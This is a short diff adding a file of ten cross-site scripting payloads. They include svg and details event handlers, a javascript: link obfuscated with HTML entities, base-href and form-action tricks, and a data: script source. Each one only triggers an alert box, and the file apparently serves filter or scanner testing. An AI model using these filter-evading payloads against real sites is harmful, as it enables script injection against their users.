@@ -1,0 +1,10 @@
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<a href="javascript:&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;Advanced XSS&#x27;&#x29;">Click me</a>
+<math><mtext><script>alert('Advanced XSS')</script></mtext></math>
+<details/open ontoggle=alert('Advanced XSS')>Click here</details>
+<marquee onstart="alert('Advanced XSS')">XSS!</marquee>
+<form><input type="submit" formaction="javascript:alert('Advanced XSS')"></form>
+<base href="javascript:alert('Advanced XSS');//">
+<svg xmlns="http://www.w3.org/2000/svg" onload="javascript:alert('Advanced XSS')"></svg>
+<script src="data:text/javascript,alert('Advanced XSS');"></script>
+<meta charset="x-user-defined"><script>alert('Advanced XSS')</script>
